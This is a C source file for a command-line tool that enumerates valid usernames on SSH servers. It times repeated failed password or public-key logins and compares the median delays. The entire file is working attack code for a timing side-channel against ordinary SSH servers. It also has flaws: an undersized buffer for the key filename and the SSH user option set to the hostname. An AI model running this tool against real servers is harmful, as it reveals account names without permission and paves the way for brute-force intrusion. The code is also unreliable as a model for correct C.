
/*
 * time_ssh_auth.c
 *
 * Copyright 2010 Martin Carpenter, mcarpenter@free.fr.
 *
 * Enumerate usernames by timing SSH authentication.
 *
 * time_ssh_auth -h
 * time_ssh_auth { -i id_file | -p password } hostname iterations username [...]
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <stdarg.h>
#include <string.h>
#include <libssh/libssh.h>

#define PUB_SUFFIX  ".pub"

#define MSG_ERROR 0
#define MSG_TEXT_ERROR "error"
#define MSG_MEDIAN 1
#define MSG_TEXT_MEDIAN "median"
#define MSG_TIME 2
#define MSG_TEXT_TIME "time"

#define MAX_RETRIES 3 /* Max auth retries for a given user on error */

void parse_options(int argc, char *argv[], const char **hostname, int *iterations, char **id_file, char **password);
void usage();
void user_msg(char *username, int msg_type, const char *fmt, ...);
int retry(char *username, int *retries);
unsigned long long compute_delay(struct timespec start, struct timespec stop);
unsigned long long median(unsigned long long *timings, int iterations);
int compare(const void *a, const void *b);

int main(int argc, char *argv[]) {

    ssh_session session;
    ssh_string public_key = NULL;
    ssh_private_key private_key = NULL;
    const char *hostname = NULL;
    char *password = NULL;
    char *id_file = NULL;
    char *id_file_pub = NULL;
    char *username = NULL;
    int iterations;
    int retries;
    int authenticated;
    int arg;
    int i;
    unsigned long long *timings;
    struct timespec start_time;
    struct timespec stop_time;

    parse_options(argc, argv, &hostname, &iterations, &id_file, &password);

    /* Allocate space for public key filename and timing results */
    if(id_file) {
        id_file_pub = malloc(strlen(id_file) + strlen(PUB_SUFFIX));
        if(NULL == id_file_pub) {
            exit(2);
        }
        strcpy(id_file_pub, id_file);
        strcat(id_file_pub, PUB_SUFFIX);
    }
    timings = malloc(iterations * sizeof(unsigned long long));
    if(NULL == timings) { 
        exit(2);
    }

    for(arg = optind; arg < argc; arg++) {

        username = argv[arg];
        retries = 0;
        for(i = 0; i < iterations; i++) {
RETRY:
            /* Set options, load key files, connect. We load keys on each
             * iteration since they are associated with the session. */
            session = ssh_new();
            ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
            ssh_options_set(session, SSH_OPTIONS_USER, hostname);
            if(id_file) {
                public_key = publickey_from_file(session, id_file_pub, NULL);
                if(NULL == public_key) {
                    user_msg(username, MSG_ERROR, "public key: %s", ssh_get_error(session));
                    if(retry(username, &retries)) {
                        goto RETRY;
                    } else {
                        timings[0] = 0;
                        break;
                    }
                }
                private_key = privatekey_from_file(session, id_file, 0, NULL); /* no pass phrase */
                if(NULL == private_key) {
                    user_msg(username, MSG_ERROR, "private key: %s", ssh_get_error(session));
                    if(retry(username, &retries)) {
                        goto RETRY;
                    } else {
                        timings[0] = 0;
                        break;
                    }
                }
            }
            if(SSH_OK != ssh_connect(session)) {
                user_msg(username, MSG_ERROR, "ssh_connect(): %s", ssh_get_error(session));
                if(retry(username, &retries)) {
                    goto RETRY;
                } else {
                    timings[0] = 0;
                    break;
                }
            }

            if(password) {
                clock_gettime(CLOCK_REALTIME, &start_time);
                authenticated = ssh_userauth_password(session, username, password);
                clock_gettime(CLOCK_REALTIME, &stop_time);
            } else if(id_file) {
                clock_gettime(CLOCK_REALTIME, &start_time);
                authenticated = ssh_userauth_pubkey(session, username, public_key, private_key);
                clock_gettime(CLOCK_REALTIME, &stop_time);
            }

            ssh_disconnect(session); /* returns void */

            if(private_key) {
                privatekey_free(private_key);
                private_key = NULL;
            }
            if(public_key) {
                string_free(public_key);
                public_key = NULL;
            }

            /* If authentication is not denied then something went wrong,
             * don't bother retrying in this case, move to next user. */
            if(SSH_AUTH_DENIED != authenticated) {
                user_msg(username, MSG_ERROR, "authentication did not fail; skipped");
                timings[0] = 0;
                break;
            }

            timings[i] = compute_delay(start_time, stop_time);
            if(password) {
                user_msg(username, MSG_TIME, "%-16s %llu", password, timings[i]);
            } else {
                user_msg(username, MSG_TIME, "%llu", timings[i]);
            }
            (void)fflush(stdout);
            (void)sleep(1);
        }
        if(0 != timings[0]) { /* not skipped */
            if(password) {
                user_msg(username, MSG_MEDIAN, "%-16s %llu", password, median(timings, iterations));
            } else {
                user_msg(username, MSG_MEDIAN, "%llu", median(timings, iterations));
            }
        }

    }

    (void)ssh_finalize(); /* don't care */

    return 0;

}

/*
 * Parse command line options.
 */
void parse_options(int argc, char *argv[], const char **hostname, int *iterations, char **id_file, char **password) {

    int error = 0;
    int flag;

    if(argc < 4) {
        usage();
        exit(2);
    }

    while((flag = getopt(argc, argv, "hi:p:")) != -1) {
        switch(flag) {
        case 'h':
            usage();
            exit(0);
            break;
        case 'i':
            *id_file = optarg;
            break;
        case 'p':
            *password = optarg;
            break;
        case '?':
        /* FALLTHROUGH */
        default:
            error = 1;
        }
    }

    if(*id_file && *password) {
        fprintf(stderr, "Cannot specify both identity file and password\n");
        error = 1;
    }

    if(!*id_file && !*password) {
        fprintf(stderr, "Must specify either identity file or password\n");
        error = 1;
    }

    if((argc - optind) < 1) {
        error = 1;
    }

    if(*id_file) {
        if(access(*id_file, R_OK)) {
            fprintf(stderr, "Cannot read identity file %s: errno=%i\n",
                    *id_file, errno);
            error = 1;
        }
    }

    *hostname = argv[optind++];
    *iterations = atoi(argv[optind++]);

    if(*iterations <= 0) {
        fprintf(stderr, "Invalid number of iterations\n");
        error = 1;
    }

    if(error) {
        usage();
        exit(2);
    }

}

/*
 * Display usage on stderr.
 */
void usage() {
    fprintf(stderr, "Usage: time_ssh_auth -h | { -i id_file | -p password } hostname iterations username [...]\n");
}

/*
 * Write message pertaining to given username.
 */
void user_msg(char *username, int msg_type, const char *fmt, ...) {

    va_list ap;
    char *msg_type_text;
    FILE *fp;

    switch(msg_type) {
        case MSG_ERROR:
            fp = stderr;
            msg_type_text = MSG_TEXT_ERROR;
            break;
        case MSG_TIME:
            msg_type_text = MSG_TEXT_TIME;
            fp = stdout;
            break;
        case MSG_MEDIAN:
            msg_type_text = MSG_TEXT_MEDIAN;
            fp = stdout;
            break;
        default:
            fprintf(stderr, "Unknown message type %i\n", msg_type);
            exit(1);
            break;
    }
    va_start(ap, fmt);
    (void)fprintf(fp, "%-16s %-7s ", username, msg_type_text);
    (void)vfprintf(fp, fmt, ap);
    (void)fprintf(fp, "\n");
    va_end(ap);

}

/*
 *  If we are able to retry then increment counter, sleep
 *  and return 1.
 */
int retry(char *username, int *retries) {

    int delay; 

    if(*retries < MAX_RETRIES) {
        delay = 1 << *retries;
        (*retries)++;
        user_msg(username, MSG_ERROR, "retrying after %i seconds", delay);
        (void)sleep(delay);
        return 1;
    } else {
        user_msg(username, MSG_ERROR, "maximum number of retries; aborted");
        return 0;
    }
}

/*
 * Calculate the difference between start and end time, returns a value
 * in nanoseconds. There are 1e9 nseconds in a second.
 */
unsigned long long compute_delay(struct timespec start, struct timespec stop) {

    long long unsigned start_nsec;
    long long unsigned stop_nsec;

    start_nsec = ((long long unsigned)start.tv_sec * 1000000000) + (long long unsigned)start.tv_nsec;
    stop_nsec  = ((long long unsigned)stop.tv_sec  * 1000000000) + (long long unsigned)stop.tv_nsec;
    return (stop_nsec - start_nsec);

}

/*
 * Compute the median of the sorted timings.
 * Side effect: sorts the timings array.
 */
unsigned long long median(unsigned long long *timings, int iterations) {

    unsigned long long median;
    int midpoint = iterations / 2;

    qsort(timings, (size_t)iterations, sizeof(unsigned long long), compare);
    if(iterations % 2) {
        /* odd */
        median = timings[midpoint];
    } else {
        /* even */
        median = ( timings[midpoint-1] + timings[midpoint] ) / 2; /* XXX rounding error */
    }

    return median;

}

/*
 * Comparison function used by libc's qsort().
 */
int compare(const void *a, const void *b) {

    int rc;

    unsigned long long ulla = *(unsigned long long *)a;
    unsigned long long ullb = *(unsigned long long *)b;

    if(ulla < ullb) {
        rc = -1;
    } else if(ulla > ullb) {
        rc = 1;
    } else { 
        rc = 0;
    }

    return rc;

}

